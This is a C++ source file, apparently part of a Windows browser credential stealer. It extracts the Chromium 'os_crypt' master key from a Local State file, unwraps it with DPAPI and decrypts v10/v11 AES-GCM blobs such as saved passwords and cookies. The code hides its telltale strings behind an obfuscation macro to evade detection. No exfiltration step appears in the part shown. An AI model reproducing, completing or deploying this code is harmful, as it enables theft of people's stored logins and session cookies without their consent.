#include "crypto.h"
#include <sodium.h>
#include <fstream>
#include <regex>
#include "json.h"
#include <windows.h>
#include "base64.h"
#include "obfusheader.h"

namespace fs = std::filesystem;

std::string Crypto::CryptoUnprotectData(const std::vector<unsigned char>& data) {
    DATA_BLOB DataIn;
    DataIn.pbData = const_cast<BYTE*>(data.data());
    DataIn.cbData = static_cast<DWORD>(data.size());
    DATA_BLOB DataOut;

    if (CryptUnprotectData(&DataIn, nullptr, nullptr, nullptr, nullptr, 0, &DataOut)) {
        std::string decrypted(reinterpret_cast<char*>(DataOut.pbData), DataOut.cbData);
        LocalFree(DataOut.pbData);
        return decrypted;
    }

    return "";
}

std::string Crypto::GetMasterKey(const std::string& path) {
    std::ifstream local_storage(path);
    std::string local_storage_data;

    if (!local_storage.is_open()) {
        return "";
    }

    while (std::getline(local_storage, local_storage_data)) {
        if (local_storage_data.empty() || local_storage_data.find(OBF("encrypted_key")) == std::string::npos)
            continue;

        try {
            auto json_data = nlohmann::json::parse(local_storage_data);
            if (json_data.contains(OBF("os_crypt")) && json_data[OBF("os_crypt")].contains(OBF("encrypted_key"))) {
                std::string encrypted_key = json_data[OBF("os_crypt")][OBF("encrypted_key")].get<std::string>();

                if (encrypted_key.empty()) {
                    return "";
                }

                encrypted_key = base64_decode(encrypted_key);
                if (encrypted_key.empty()) {
                    return "";
                }

                encrypted_key = encrypted_key.substr(5);
                std::vector<unsigned char> encrypted_key_vec(encrypted_key.begin(), encrypted_key.end());
                std::string master_key = CryptoUnprotectData(encrypted_key_vec);

                if (master_key.empty()) {
                    return "";
                }

                return master_key;
            }
        }
        catch (const std::exception&) {
            return "";
        }
    }

    return "";
}

std::string Crypto::AES256GCMDecrypt(const std::string& key, const std::vector<unsigned char>& ciphertext) {
    const size_t ciphertext_size = ciphertext.size() - 3 - crypto_aead_aes256gcm_NPUBBYTES;

    if (sodium_init() == -1) {
        return "";
    }

    if (ciphertext[0] == 118 && ciphertext[1] == 49 && (ciphertext[2] == 48 || ciphertext[2] == 49)) {
        const auto* uKey = reinterpret_cast<const unsigned char*>(key.c_str());

        auto* nonce = new unsigned char[crypto_aead_aes256gcm_NPUBBYTES];
        std::copy_n(ciphertext.begin() + 3, crypto_aead_aes256gcm_NPUBBYTES, nonce);

        auto* ciphertext_ = new unsigned char[ciphertext_size];
        std::copy_n(ciphertext.begin() + 3 + crypto_aead_aes256gcm_NPUBBYTES, ciphertext_size, ciphertext_);

        auto* decrypted = new unsigned char[ciphertext_size - crypto_aead_aes256gcm_ABYTES];
        unsigned long long decrypted_len;

        if (crypto_aead_aes256gcm_decrypt(decrypted, &decrypted_len, nullptr, ciphertext_, ciphertext_size, nullptr, 0, nonce, uKey) != 0) {
            return "";
        }

        std::string result(reinterpret_cast<char*>(decrypted), decrypted_len);
        return result;
    }

    return CryptoUnprotectData(ciphertext);
}
